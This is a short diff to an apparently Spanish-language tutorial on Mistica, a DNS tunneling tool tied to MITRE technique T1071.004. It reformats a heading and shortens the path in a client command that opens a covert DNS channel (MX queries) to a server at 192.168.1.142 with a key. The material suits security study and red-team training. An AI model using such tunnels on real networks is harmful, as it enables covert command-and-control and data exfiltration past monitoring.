@@ -182,9 +182,9 @@ Más información: [https://attack.mitre.org/techniques/T1071/004/](https://atta
 
 ![image110.png]({{site.baseurl}}/images/Mistica/image110.png)
 
-Cliente:
+**Cliente**
 
-`python.exe C:\Users\Sergio\Downloads\Mistica-master\mc.py -m io:dns -w "--hostname 192.168.1.142 --port 53 --query MX" -k key`
+`python.exe mc.py -m io:dns -w "--hostname 192.168.1.142 --port 53 --query MX" -k key`
 
 ![image111.png]({{site.baseurl}}/images/Mistica/image111.png)
 
